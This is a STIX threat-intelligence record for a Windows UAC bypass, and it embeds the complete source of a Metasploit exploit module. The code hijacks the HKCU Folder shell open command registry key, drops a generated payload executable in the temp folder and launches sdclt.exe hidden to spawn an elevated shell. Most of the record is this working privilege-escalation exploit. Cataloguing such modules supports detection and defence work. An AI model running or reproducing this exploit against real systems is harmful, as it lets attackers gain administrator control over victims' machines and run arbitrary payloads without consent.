{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8ea47a23-4d00-49aa-a079-125af9f61bb7",
    "created": "2024-08-14T16:49:21.927163Z",
    "modified": "2024-08-14T16:49:21.927167Z",
    "name": "Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)",
    "description": " This module will bypass Windows UAC by hijacking a special key in the Registry under the current user hive, and inserting a custom command that will get invoked when Window backup and restore is launched. It will spawn a second shell that has the UAC flag turned off.  This module modifies a registry key, but cleans up the key once the payload has been invoked.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/bypassuac_sdclt.rb",
            "external_id": "bypassuac_sdclt.rb"
        },
        {
            "source_name": "reference",
            "url": "https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-SDCLTBypass.ps1"
        },
        {
            "source_name": "reference",
            "url": "https://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Post::Windows::Priv\n  include Post::Windows::Runas\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)',\n        'Description' => %q{\n          This module will bypass Windows UAC by hijacking a special key in the Registry under\n          the current user hive, and inserting a custom command that will get invoked when\n          Window backup and restore is launched. It will spawn a second shell that has the UAC\n          flag turned off.\n\n          This module modifies a registry key, but cleans up the key once the payload has\n          been invoked.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'enigma0x3', # UAC bypass discovery and research\n          'bwatters-r7', # Module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [\n          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, SCREEN_EFFECTS ],\n          'Reliability' => []\n        },\n        'References' => [\n          ['URL', 'https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/'],\n          ['URL', 'https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-SDCLTBypass.ps1'],\n          ['URL', 'https://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass']\n        ],\n        'DisclosureDate' => '2017-03-17',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [OptString.new('PAYLOAD_NAME', [false, 'The filename to use for the payload binary (%RAND% by default).', nil])]\n    )\n  end\n\n  def check\n    version = get_version_info\n    if version.build_number >= Msf::WindowsVersion::Vista_SP0 && is_uac_enabled?\n      Exploit::CheckCode::Appears\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def write_reg_values(registry_key, payload_pathname)\n    registry_createkey(registry_key) unless registry_key_exist?(registry_key)\n    registry_setvaldata(registry_key, 'DelegateExecute', '', 'REG_SZ')\n    registry_setvaldata(registry_key, '', payload_pathname, 'REG_SZ')\n  rescue ::Exception => e\n    print_error(e.to_s)\n  end\n\n  def exploit\n    @registry_key = ''\n    @remove_registry_key = false\n    check_permissions!\n    case get_uac_level\n    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,\n      UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,\n      UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT\n      fail_with(Failure::NotVulnerable,\n                \"UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...\")\n    when UAC_DEFAULT\n      print_good('UAC is set to Default')\n      print_good('BypassUAC can bypass this setting, continuing...')\n    when UAC_NO_PROMPT\n      print_warning('UAC set to DoNotPrompt - using ShellExecute \"runas\" method instead')\n      shell_execute_exe\n      return\n    end\n\n    @registry_key = 'HKCU\\Software\\Classes\\Folder\\shell\\open\\command'\n    @remove_registry_key = !registry_key_exist?(@registry_key)\n\n    # get directory locations straight\n    win_dir = session.sys.config.getenv('windir')\n    vprint_status('win_dir = ' + win_dir)\n    tmp_dir = session.sys.config.getenv('tmp')\n    vprint_status('tmp_dir = ' + tmp_dir)\n    exploit_dir = win_dir + '\\\\System32\\\\'\n    vprint_status('exploit_dir = ' + exploit_dir)\n    target_filepath = exploit_dir + 'sdclt.exe'\n    vprint_status('exploit_file = ' + target_filepath)\n\n    # make payload\n    payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha(6..14) + '.exe'\n    payload_pathname = tmp_dir + '\\\\' + payload_name\n    vprint_status('payload_pathname = ' + payload_pathname)\n    vprint_status('Making Payload')\n    payload = generate_payload_exe\n    reg_command = exploit_dir + \"cmd.exe /c start #{payload_pathname}\"\n    vprint_status('reg_command = ' + reg_command)\n    write_reg_values(@registry_key, reg_command)\n\n    # Upload payload\n    vprint_status(\"Uploading Payload to #{payload_pathname}\")\n    write_file(payload_pathname, payload)\n    vprint_status('Payload Upload Complete')\n\n    vprint_status('Launching ' + target_filepath)\n    begin\n      session.sys.process.execute(\"cmd.exe /c \\\"#{target_filepath}\\\"\", nil, 'Hidden' => true)\n    rescue ::Exception => e\n      print_error(\"Executing command failed:\\n#{e}\")\n    end\n    print_warning(\"This exploit requires manual cleanup of '#{payload_pathname}'\")\n    print_status('Please wait for session and cleanup....')\n  end\n\n  def cleanup\n    if @registry_key.present?\n    vprint_status('Removing Registry Changes')\n      if @remove_registry_key\n        registry_deletekey(@registry_key)\n      else\n      registry_deleteval(registry_key, \"DelegateExecute\")\n        registry_deleteval(@registry_key, '')\n      end\n    print_status('Registry Changes Removed')\n    end\n  end\n\n  def check_permissions!\n    unless check == Exploit::CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')\n    end\n    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?\n    # Check if you are an admin\n    # is_in_admin_group can be nil, true, or false\n    print_status('UAC is Enabled, checking level...')\n    vprint_status('Checking admin status...')\n    case is_in_admin_group?\n    when true\n      print_good('Part of Administrators group! Continuing...')\n      if get_integrity_level == INTEGRITY_LEVEL_SID[:low]\n        fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')\n      end\n    when false\n      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n    when nil\n      print_error('Either whoami is not there or failed to execute')\n      print_error('Continuing under assumption you already checked...')\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2017-03-17",
    "x_mitre_platforms": [
        "['win']"
    ]
}